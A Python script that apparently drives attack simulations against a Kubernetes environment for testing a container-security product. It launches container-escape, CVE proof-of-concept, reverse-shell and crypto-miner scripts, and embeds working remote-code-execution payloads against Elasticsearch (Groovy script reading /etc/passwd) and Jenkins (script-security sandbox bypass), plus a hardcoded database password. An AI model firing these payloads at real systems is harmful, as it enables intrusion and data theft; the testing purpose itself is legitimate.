import sys, argparse, os, time, json, pymysql

attck_dict = {'ca':'credential access', 'def':'defense evasion', 'disc':'discovery', 'exec':'execution', 'exf':'exfiltration', 'move':'lateral movement', 'pers':'persistence', 'priv':'privilege escalation', 'all':'all scripts'}

goat_dict = {'chroot':'CHROOT-CONTAINER-ESCAPE', 'dind':'docker-in-docker', 'info':'Gaining-environment-information', 'bypassns':'K8s-Namespaces-bypass', 'procfs':'procfs-escape', 'cgroup':'cgroup-escape', 'debugfs':'debugfs-escape'}

script_dir = '/test/'


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--attck", help="run ATT&CK-Script")
    parser.add_argument("--goat", help="run K8S-Goat-Script")
    parser.add_argument("--cve", help="run CVE-POC", action="store_true")
    parser.add_argument("--rs", help="run Reverse-Shell-Script", action="store_true")
    parser.add_argument("--cm", help="run Crypto-Miner-Script", action="store_true")
    parser.add_argument("--dp", help="run Drift-Prevention-Script", action="store_true")
    parser.add_argument("--watson", help="run Watson-Script", action="store_true")
    parser.add_argument("--test", help="run ATT&CK test", action="store_true")
    parser.add_argument("--report", help="show attack's results", action="store_true")
    return parser.parse_args()

def run_cmd(type, command):
	os.system(script_dir+type+'/'+command+'.sh')
	show_results("\033[31m"+"Successfully exploit "+type+' '+eval(type+'_dict')[command]+" attacks\033[0m")

def show_results(success_words):
	global attack_list
	print(success_words)
	with open('/test/results.txt', 'a+') as f:
		f.write(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+': '+success_words+'\n')

args = parse_args()

if args.attck:
	if args.attck == 'all':
		os.system('/test/attck/script.sh')
		print("\033[31m"+"Successfully exploit all attck attacks\033[0m")
	else:
		run_cmd('attck', args.attck)

if args.goat:
	run_cmd('goat', args.goat)

if args.cve:
	os.system('/test/cve/CVE-2019-14287/script.sh')
	os.system('python3 /test/cve/CVE-2019-3874/server.py')
	os.system('python3 /test/cve/CVE-2020-14386/server.py')
	os.system('/usr/lib/go-1.10/bin/go run /test/cve/CVE-2019-5736/main.go')
	show_results("\033[31m"+"Successfully exploit all cve attacks\033[0m")

if args.rs:
	os.system('/test/rerverse_shell/RS-NC/script.sh')
	os.system('/test/rerverse_shell/RS-SOCKET_AND_DUP2/script.sh')
	show_results("\033[31m"+"Successfully exploit all reverse shelll attacks\033[0m")

if args.cm:
	os.system('/test/crypto_miner/script.sh')
	show_results("\033[31m"+"Successfully exploit crypto miner attacks\033[0m")

if args.dp:
	os.system('/test/drift-prevention/script.sh')
	show_results("\033[31m"+"Successfully exploit drift prevention attacks\033[0m")

if args.watson:
	if os.getenv("RDB_HOST"):
		RDB_HOST = os.getenv("RDB_HOST")
	else:
		RDB_HOST = 'tensorsec-mysql-ha-leader'
	if os.getenv("RDB_PORT"):
		RDB_PORT = int(os.getenv("RDB_PORT"))
	else:
		RDB_PORT = 3306
	if os.getenv("RDB_USER"):
		RDB_USER = os.getenv("RDB_USER")
	else:
		RDB_USER = 'ivan'
	if os.getenv("RDB_PASSWORD"):
		RDB_PASSWORD = os.getenv("RDB_PASSWORD")
	else:
		RDB_PASSWORD = 'Mysql-ha@123'
	if os.getenv("RDB_DBNAME"):
		RDB_DBNAME = os.getenv("RDB_DBNAME")
	else:
		RDB_DBNAME = 'ivan'
	db = pymysql.connect(host=RDB_HOST, port=RDB_PORT, user=RDB_USER, password=RDB_PASSWORD, database=RDB_DBNAME)
	cursor = db.cursor()
	#redis
	cursor.execute("select pod_ip from ivan_assets_pod_res_relations where pod_name like '51c1c6%'")
	data = cursor.fetchall()
	for ip in data:
		print (ip[0])
		res = os.popen("curl " + ip[0] + ":8080 --connect-timeout 3").read()
		print(res)
		os.popen("redis-cli -h " + ip[0])
	#es
	cursor.execute("select pod_ip from ivan_assets_pod_res_relations where pod_name like '75fb1c%'")
	data = cursor.fetchall()
	for ip in data:
		print (ip[0])
		res = os.popen('curl ' + ip[0] + ':9200/website/blog --data \'{"name":"test"}\' --connect-timeout 3').read()
		print(res)
		res = os.popen('curl ' + ip[0] + ':9200/_search?pretty --data \'{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"cat /etc/passwd\\").getText()"}}}\' --connect-timeout 3').read()
		print(res)
	#tomcat
	cursor.execute("select pod_ip from ivan_assets_pod_res_relations where pod_name like 'b0f328%'")
	data = cursor.fetchall()
	for ip in data:
		print (ip[0])
		res = os.popen("curl " + ip[0] + ":8080 --connect-timeout 3").read()
		print(res)
		res = os.popen("curl " + ip[0] + ":8009 --connect-timeout 3").read()
		print(res)
	#jenkins
	cursor.execute("select pod_ip from ivan_assets_pod_res_relations where pod_name like '99a7ca%'")
	data = cursor.fetchall()
	for ip in data:
		print (ip[0])
		res = os.popen("curl " + ip[0] + ":8080 --connect-timeout 3").read()
		print(res)
		res = os.popen("curl " + ip[0] + ":8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true\\&value=public%20class%20x%20%7Bpublic%20x%28%29%7B%22touch+/tmp/test123%22.execute%28%29%7D%7D --connect-timeout 3").read()
		print(res)
	#jupyter
	cursor.execute("select pod_ip from ivan_assets_pod_res_relations where pod_name like 'ddc305%'")
	data = cursor.fetchall()
	for ip in data:
		print (ip[0])
		res = os.popen("curl " + ip[0] + ":8888 --connect-timeout 3").read()
		print(res)
	show_results("\033[31m"+"Successfully exploit watson attacks\033[0m")
	db.close()

if args.test:
	for i in range(1,9):
		str = os.popen("cat /test/json/test%d.json" % i).read()
		data = json.loads(str)
		data["output_fields"]["k8s.pod.name"] = os.popen("hostname").read()
		data["output_fields"]["container.id"] = os.popen("cat /proc/1/cgroup | grep pids | awk -F '/' '{print $5}' | awk -F '-' '{print $2}'|cut -b -12").read()
		data["output_fields"]["k8s.pod.id"] = os.popen("cat /proc/1/mountinfo | grep 'etc-hosts' | awk -F / {'print $6'}").read()
		new_data = json.dumps(data)
		with open("/test/json/new.json", "w") as f:
			f.write(new_data)
		os.popen("cat /test/json/new.json|/test/json/run.sh").read()

if args.report:
	with open('/test/results.txt', 'r') as f:
		for result in f:
			print(result)
